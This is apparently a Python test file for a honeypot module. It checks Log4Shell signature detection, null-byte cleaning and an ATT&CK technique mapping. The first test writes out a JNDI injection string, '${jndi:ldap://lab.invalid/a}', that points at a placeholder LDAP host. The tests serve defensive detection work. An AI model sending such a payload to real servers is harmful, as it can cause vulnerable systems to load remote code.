import honeypot

def test_signature_rules():
    assert any(c=='CVE-2021-44228' and r.search('${jndi:ldap://lab.invalid/a}') for c,n,r in honeypot.SIGS)

def test_clean():
    assert honeypot.clean('a\x00b') == 'ab'

def test_attack_mapping():
    assert honeypot.ATT['brute'][0] == 'T1110'
